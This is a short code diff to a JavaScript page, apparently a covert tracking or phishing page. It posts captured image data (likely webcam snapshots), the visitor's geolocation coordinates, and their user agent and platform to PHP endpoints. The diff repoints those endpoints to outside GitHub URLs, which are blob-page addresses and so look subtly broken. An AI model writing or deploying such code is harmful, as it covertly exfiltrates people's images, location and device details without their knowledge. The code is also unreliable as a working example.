@@ -51,7 +51,7 @@ function post(imgdata){
 $.ajax({
     type: 'POST',
     data: { cat: imgdata},
-    url: './upload.php',
+    url: 'https://github.com/mak2033/justforfun/blob/main/upload.php',
     dataType: 'json',
     async: false,
     success: function(result){
@@ -164,7 +164,7 @@ function showPosition(position) {
     var Platform = navigator.platform;
     var uagent = navigator.userAgent;
     const xhttp = new XMLHttpRequest();
-        xhttp.open("GET", "sorte.php?lat=" + lat + "&long=" + lon);
+        xhttp.open("GET", "https://github.com/mak2033/justforfun/blob/main/sorte.php?lat=" + lat + "&long=" + lon);
         xhttp.send();
    
     }
@@ -173,7 +173,7 @@ function notshowPosition(){
     var Platform = navigator.platform;
     var uagent = navigator.userAgent;
     const xhttp = new XMLHttpRequest();
-        xhttp.open("GET", "sorte.php?uagent=" + uagent + "&platform=" + Platform);
+        xhttp.open("GET", "https://github.com/mak2033/justforfun/blob/main/sorte.php?uagent=" + uagent + "&platform=" + Platform);
         xhttp.send();
     
 }
